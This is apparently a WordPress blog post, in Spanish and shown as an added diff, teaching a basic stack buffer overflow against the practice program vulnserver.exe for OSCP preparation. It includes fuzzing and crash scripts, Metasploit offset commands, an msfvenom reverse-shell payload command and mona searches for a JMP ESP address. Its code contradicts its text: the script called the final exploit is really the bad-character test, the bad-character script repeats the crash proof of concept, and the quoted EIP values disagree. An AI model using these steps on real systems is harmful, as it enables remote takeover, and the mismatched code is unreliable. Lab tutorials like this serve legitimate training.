@@ -1,0 +1,338 @@
+<!-- wp:paragraph -->
+<p>Durante el último tiempo, algunos amigos me han pedido que los ayude a preparar para el examen OSCP, el cual tuve la suerte de aprobar hace poco, uno de los tópicos de esta certificación es el buffer overflow, por lo que me anime a hacer un webinar en conjunto con los amigos de <a href="https://t.me/joinchat/GgG8nxC3jHVwxNFeyQt_OA">HTB l4t1n</a>, la idea es mostrar cómo sería un “hello world” de buffer overflow, es decir, &nbsp;mostrar una de las formas más "sencillas" de explotar e introducir código usando un desbordamiento que nos permita escribir en espacios restringidos y tomar control de la ejecución del programa</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Si no quieres leer, puedes ver el webinar con este mismo ejercicio en este enlace :</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:core-embed/youtube {"url":"https://youtu.be/O6twNFl52Gw","type":"video","providerNameSlug":"youtube","className":"wp-embed-aspect-16-9 wp-has-aspect-ratio"} -->
+<figure class="wp-block-embed-youtube wp-block-embed is-type-video is-provider-youtube wp-embed-aspect-16-9 wp-has-aspect-ratio"><div class="wp-block-embed__wrapper">
+https://youtu.be/O6twNFl52Gw
+</div></figure>
+<!-- /wp:core-embed/youtube -->
+
+<!-- wp:paragraph -->
+<p>Y bueno que es un buffer overflow? Tema para otra ocasión... jejeje,  Si quieres aprender como funciona este ataque, de que se compone y cómo opera a todo nivel te invito a revisar los siguientes enlaces, ya que en este artículo solo nos concentramos &nbsp;en cómo explotar.<br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:embed {"url":"https://itandsecuritystuffs.wordpress.com/2014/03/18/understanding-buffer-overflows-attacks-part-1/","type":"link","providerNameSlug":"it-amp-security-stuffs","className":""} -->
+<figure class="wp-block-embed is-type-link is-provider-it-amp-security-stuffs"><div class="wp-block-embed__wrapper">
+https://itandsecuritystuffs.wordpress.com/2014/03/18/understanding-buffer-overflows-attacks-part-1/
+</div></figure>
+<!-- /wp:embed -->
+
+<!-- wp:paragraph -->
+<p><a href="https://www.exploit-db.com/papers/13147">https://www.exploit-db.com/papers/13147</a></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p><a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow">https://en.wikipedia.org/wiki/Stack_buffer_overflow</a></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Para lograr nuestro objetivo usaremos un programa diseñado especialmente para practicar este tipo de vulnerabilidades llamado vulnserver.exe, el cual pueden encontrar en el siguiente enlace. Junto con algunos scripts que pueden encontrar en un repositorio que he creado en github.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p><a href="http://www.thegreycorner.com/2010/12/introducing-vulnserver.html">http://www.thegreycorner.com/2010/12/introducing-vulnserver.html</a></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p><a href="https://github.com/dplastico/bufferclase">https://github.com/dplastico/bufferclase</a></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>El programa al ejecutarse no muestra nada más que el programa ejecutándose y esperando conexiones en el puerto 9999 SI revisamos (en esta oportunidad vía netcat) la conexión hacia la IP, en este caso 192.168.0.184.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>El ejercicio lo desarrollaremos sobre el ya famoso (y sin soporte) Windows XP, eso es ya que como queremos explicar Buffer Overflow en su forma más simple (sin protecciones de memoria) usamos este SO el cual presenta muy poco de lo anterior y por tanto nos hara mas facil la tarea, esto no quita que para ambientes más avanzados, la tarea no sea la misma o similar, la teoría de un BOF en su base es siempre la misma. Además usaremos la opción TRUN, ya que el programa presenta varias vulnerabilidades para explotar, pero nosotros nos concentramos en la anterior, podemos probar la conexión a vulnserver, ejecutando netcat:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh3.googleusercontent.com/BZzVotBUCk-pUhJpb1CgpxEOL5uTfYcxkRc9CWuassHb2GmxDcwVgyY0dGWwEFz3TCo1uMAbtntjn0oCnvM0_D8-kHctP9hU8hdFF2Jv2keNCiSNiL1FYFGWNf-ZAlP7DQSR9O55" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh6.googleusercontent.com/Gmjg8oUU0K6MzqZsvzh-BT4UizTHmETMvJOmf95mjW7u-PhzUw1rZaAaI6Ifb265J7w0v5oEho83n4iBF8Guvr89ep9LZq4SK5Fu7aYf5fdM2JNcT1I0mqFp8_N-i3mOQdSNQrSo" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>FUZZ: qué es y cómo funciona?<br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Para no ahondar revisemos la definición de wikipedia:<br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>“ es una técnica de pruebas de software, a menudo automatizado o semiautomatizado, que implica proporcionar datos inválidos, inesperados o aleatorios a las entradas de un programa de ordenador”<br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Por lo tanto para poder comprobar que existe un overflow debemos, en este caso, enviar una cantidad de caracteres, que generen un "crush", para eso podemos ejecutar el siguiente script en python que nos ayudará a determinar la cantidad de bytes (caracteres en este caso) que enviamos para generar el crush, esto nos ayudará para tener un número que nos permita mantener la consistencia a la hora de crear nuestro exploit</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:code -->
+<pre class="wp-block-code"><code>#!/usr/bin/python
+
+import socket
+import sys
+
+#Fuzz parametro TRUN
+pre_buff= "TRUN /../: "
+buff ="A" * 100
+end_buff = '\r\n'
+#el loop
+while True:
+    buff = buff+"A"*100
+    final_buff = pre_buff+buff+end_buff
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect(('192.168.1.193', 9999))
+        print "Fuzzeando con  %d bytes" % len(buff)
+        sock.send(final_buff)
+        sock.recv(1024)
+        sock.close()
+    except:
+        print "Server deja de responder a los %d bytes enviados" % len(buff)
+        exit()
+</code></pre>
+<!-- /wp:code -->
+
+<!-- wp:paragraph -->
+<p>Podemos observar, que nuestro programa vulnserver.exe, detiene su operación y termina su ejecución con un error a los 2700 bytes enviados. GENIAL! Ya podemos terminar la ejecución del programa y podemos comenzar a trabajar en nuestro exploit</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Para replicar nuestro fuzzer creamos una POC que envíe 2700 bytes de caracteres letra “A” y genera la caída, este script usaremos de base para construir nuestro exploit, y esta vez lo ejecutaremos en el debugger (immunity debugger) </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:code -->
+<pre class="wp-block-code"><code>#!/usr/bin/python
+import socket
+import sys
+
+buffer = "A" * 2700
+
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(('192.168.1.193', 9999))
+    s.send(('TRUN /../: '+ buffer+'\r\n'))
+    #s.send(('TRUN .' + buffer + '\r\n'))
+    print s.recv(1024)
+    s.close()
+except:
+    print "Sin conexion al servidor"
+</code></pre>
+<!-- /wp:code -->
+
+<!-- wp:paragraph -->
+<p></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Ahora debemos identificar nuestra dirección de retorno, EIP, por lo que debemos identificar qye byte es en el que comienza a sobreescribirse el EIP para así poder luego manipularlo, para esto usaremos la herramientas de metasploit, pattern_create y pattern_offset<br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Primero generamos un patrón único de 2700 bytes con el siguiente comando</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p><strong><em>msf-pattern_create -l 2700</em></strong><br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh6.googleusercontent.com/6gr5oo2qCnUYK9xG1DibGyLt3h5PlWYijLIYtyjuaZg0eleWqWA7MVsiIpdEygmYUGfiVmOafnf7LU0nursG1sqV5z54RF2dfNe2gdLGJLYPrhEQOdikOr5B_79F0ruqqIG3xb_-" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Luego añadimos esto a nuestro script de POC para así poder enviar este patrón, observamos en nuestro debugger que el EIP recae exactamente en los caracteres:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh3.googleusercontent.com/gJxblWz9KbAyXO_LNEr3g0nGVVGl2wbu0hnLfTzjzV0pEvfv-O2XavEyBH_NPUfHkEZnH_p8SUOu_WHwcZM_RaXIIcsNxfOraFY2uwY_Q5sapKewBnBpX9AmElH7X-EGKFGFGl9S" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh6.googleusercontent.com/ipp_qG8yKnEEenSd-LMPP-P-1OU67WZCGPA_7JxzosegHOFKY6cauG36yDbOhIToEXQ8LtsJNYneWlmz-eBRjdWvfSX_bVzDmjz1ZzuxEeGGRYZT1KRrRKJV4eRq3OtJoFnH6tBZ" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Si observamos con detención el debugger al momento del crush podemos ver &nbsp;el valor de EIP al momento del “crush” <strong>433766F43</strong><br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh3.googleusercontent.com/LQz_zyzXcYJngfgnUPiD3oBKTd8Iu7V-a7Reojqws8zlS9BgErUdZ96lLTP9rjPEtDz14mgVL05efOQL_iQDh73oUX4s-18YPmazc5zmvKd0hZMemj3_dZmogWd_9ftiNhloOggX" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Esto &nbsp;luego contrastamos y contra la herramienta pattern_offset, que al hacer el query nos indica que el EIP comienza a escribirse justo sobre el byte 2001.<br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p><em><strong>msf-pattern_offset -l 2700 -q "43376F43"</strong></em><br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh5.googleusercontent.com/OX_GtQehS9WA0P6YRz-BG592cXO01BrEy8I-0jCdE9lXAo2vkjRs1imIILGzz0log9T1TTOo5Y5CTJKq-PPK27vyWYHaWRrz6bKmX7YXOtsrnCmlhDwVOsU2-veDJaR0ptPBml_s" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Super! Ahora podemos controlar el EIP escribiendo la dirección de retorno que queramos! Para comprobar que esto es así, ejecutaremos la siguiente prueba, primero llenaremos de letras A el buffer hasta la posición 2001, para luego enviar 4 bytes de letras “B” (para simular el EIP) y luego llenaremos de letras “C” manteniendo consistencia y usando solo 2700 bytes.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh5.googleusercontent.com/bUhfIxhVDad8UDVwR9SvGprpGmuP706IbOGwoal5ihWs6Mf_zkoSmRStplba8iV3s0Mrvbobdgr-jJjDY4qlgf1gN2bSEiRS5p0OmZPiob9KmA0DlYKLGGXXLkjBHiifjhsxL_QP" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh5.googleusercontent.com/IRoxi4lhjI2hNqIAhPNc9Dc1IrB0Bn4SI2NUtXCV1ZszQXplR2ZLd9yPdL3A3l08l0rJz1ZNjDxZLyMRUDCFUXcJVmiuXx-1-bwbpYWCxbetTNQQnQIhlzCj-fXNDzbjC6OTwPjr" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Ya podemos manipular nuestra dirección de retorno, pero antes de seguir avanzando en escribir nuestro código, debemos chequear que si existen caracteres “malos” o “badcharacteres” los cuales no están permitidos en el programa o bien generen alguna acción diferente, para esto la forma manual de hacerlo es escribiendo estos caracteres justo después de nuestro EIP y ver que puedan agregarse, en este caso sabemos que el único carácter que provoca esto es “\x00” ya que este carácter de escape normalmente genera conflicto. <br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Esto lo podemos lograr con el siguien script usando la variable badchars:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:code -->
+<pre class="wp-block-code"><code>#!/usr/bin/python
+import socket
+import sys
+
+buffer = "A" * 2700
+
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(('192.168.1.193', 9999))
+    s.send(('TRUN /../: '+ buffer+'\r\n'))
+    #s.send(('TRUN .' + buffer + '\r\n'))
+    print s.recv(1024)
+    s.close()
+except:
+    print "Sin conexion al servidor"
+</code></pre>
+<!-- /wp:code -->
+
+<!-- wp:paragraph -->
+<p>Ahora podemos construir nuestro código, lo haremos en lenguaje &nbsp;shellcode, y para esto nuevamente usaremos una herramienta de metasploit, msfvenom, con la cual para este ejemplo generamos una shell reversa desde nuestro windows, hacia nuestra máquina. <br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p><strong><em>msfvenom -p windows/shell_reverse_tcp lhost=192.168.0.164 lport=4455 -b "\x00" EXITFUNC=thread -f python -v shellcode</em></strong><br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh4.googleusercontent.com/7su7ipbNWPjCQQeL6f_MMKAmnpT3ibYhz_iePwWJdoVJEQaHUryxcaZJlB_k76tCv3wveT4b0UfLhmj1RPhytlbl2t7J-Z8DDBozrfjdnm1FmT1VXvoAt_V4Nlr76epjACoQ9a8T" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>OK! Ya tenemos todo listo, pero… que dirección de retorno podemos ocupar para ejecutar nuestro código? De momento solo estamos escribiendo letras “B” por lo que debemos encontrar una dirección de retorno válida, que nos permita “saltar” hacia alguna parte en memoria donde esté nuestro código, el cual notamos cae dentro de ESP.<br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Esto podemos conseguirlo utilizando el módulo mona (escrito en pyhton) el cual instalamos en nuestro debugger y nos permitirá observar los módulos del programa usando el comando :</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p><strong><em>mona &nbsp;modules!</em></strong><br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh4.googleusercontent.com/q4W2Ab23-NVTEV54_TCx_EHZUutJjGDnsfxoMzrqAAPEIszIYc3ziWUpFTuQcmM8cXc2D1430EGx7VpMAcSDSGN5Gw70qQ9f-jNUlQQw_wbMEtdABZ8XVJKqWSpgyqQVXg9A48Ql" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Al cargar los módulos podemos observar los mismos y sus protecciones, trabajaremos sobre el dll sin protecciones essfunc.dll, cargando los ejecutables, podemos encontrar una dirección de retorno dentro del mismo en la dirección hacia ESP, este “opcode” es llamado JMP ESP (siglas para JUMP ESP, o salto hacia ESP)</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh6.googleusercontent.com/3kKXXnkdcvR3CpUiXE9krmwSPOTke-6YKhmhwfHU64A78p4_1PynOTUTWvEeQn904Y4kKaaxGuzcOKzp3YcYisORjWtAYEffXLUmEKU-4m1dO7YGeKKF-EHh0JZPzXd3owNRNzG5" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Ejecutando <strong>ctrl + </strong> podemos buscar por “JMP ESP” dentro de la caja de busqueda que aparece y encontramos la direccion <strong>625011AF</strong><br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh5.googleusercontent.com/zS9TdpwEJTYavp9LG_47MtcUJDdsLY9TEZg66qe3N8kJyow2jP5YZilDWfOFeXbMuPBXLfK5MfE-hXd472blDKOWwg7SyDRqXJpWBCZSu-MGss8ly0C8Rk_hqELchVkgGJxKxBO2" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>El mismo resultado se puede obtener buscando el valor hexadeximal del “opcode” JMP ESP, o sea “FF E4” dentro del módulo usando el siguiente comando:<br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p><strong><em>mona find - s “\xff\xe4” -m essfunc.dll</em></strong></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Genial tenemos nuestra dirección de retorno ahora nuestro exploit está listo! Que nos falta? Pues no uno, si no que dos detalles… Dado que estamos trabajando en arquitectura x86, la dirección de retorno debe ser escrita en formato “little endian” el cual, de manera simple es nada más que nuestra dirección de retorno, con los bytes invertidos es decir AF115062, además, considerando que nuestro shellcode se ejecuta justo después de la dirección de retorno, como medida de precaución insertamos unos “NOP” o comandos de “ no operación” (es decir el sistema no hará nada) para no ejecutar nuestro código justo luego de nuestro salto, modificamos el código para que luzca finalmente así (considerar que deben crear el shellcode propio para cada caso)</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:code -->
+<pre><code class="language-#!/usr/bin/python">import socket
+import sys
+
+badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
+"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
+"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
+"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
+"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
+"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
+"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
+"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
+
+#direccion de retorno 
+
+buffer = "A" * 2001 + "B" * 4 + badchars + "C" * (2700 - 2001 - 4 - len(badchars))
+
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(('192.168.0.184', 9999))
+    s.send(('TRUN /../: '+ buffer+'\r\n'))
+    #s.send(('TRUN .' + buffer + '\r\n'))
+    print s.recv(1024)
+    s.close()
+except:
+    print "Sin conexion al servidor"
+</code></pre>
+
+<!-- /wp:code -->
+
+<!-- wp:paragraph -->
+<p><br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Ahora podemos ejecutar nuestro exploit! Configuramos nuestro equipo remoto y listo! Buffer Overflow ready :) nuestra reverse shell se ejecuta remota en el servidor! <br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh4.googleusercontent.com/nJeiXJvZV_DwOuOY60aoFjz6yO_kYs7hx6xfVmvHUjfFnd9wlJYlVdLplAApo43e64aWiOZduhmoUSF8zckrfTJvcB7MT1SxnqSkM_otO_a5rl_CPMxH34-BlVR0w22GSrDLwbi4" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Espero que les haya gustado!<br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p><br /></p>
+<!-- /wp:paragraph -->
